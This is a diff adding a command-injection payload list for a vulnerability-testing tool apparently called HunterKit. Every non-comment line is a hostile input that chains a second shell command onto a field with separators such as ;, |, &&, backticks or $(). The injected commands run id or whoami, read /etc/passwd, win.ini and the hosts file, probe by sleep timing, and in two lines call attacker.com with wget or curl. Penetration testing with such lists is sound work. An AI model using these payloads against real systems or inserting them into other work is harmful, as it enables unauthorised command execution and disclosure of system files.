@@ -1,0 +1,43 @@
+# HunterKit Advanced Payload File
+# COMMAND vulnerability testing payloads
+# Developed by Kawindu Wijewardhane (@kawinduwijewardhane)
+# Add your custom payloads here - one payload per line
+# Lines starting with # are comments and will be ignored
+
+; id
+| id
+&& id
+|| id
+`id`
+$(id)
+; whoami
+| whoami
+&& whoami
+|| whoami
+; uname -a
+| uname -a
+; cat /etc/passwd
+| cat /etc/passwd
+&& ls -la
+|| pwd
+; find / -name passwd
+; dir
+| dir
+&& dir
+|| dir
+; type C:\windows\win.ini
+| type C:\windows\system32\drivers\etc\hosts
+&& whoami
+|| systeminfo
+; ver
+; sleep 5
+| sleep 5
+&& sleep 5
+|| sleep 5
+; ping -c 5 127.0.0.1
+$(sleep 5)
+`sleep 5`
+; wget http://attacker.com/test
+| curl http://attacker.com/test
+&& nslookup google.com
+|| ping google.com
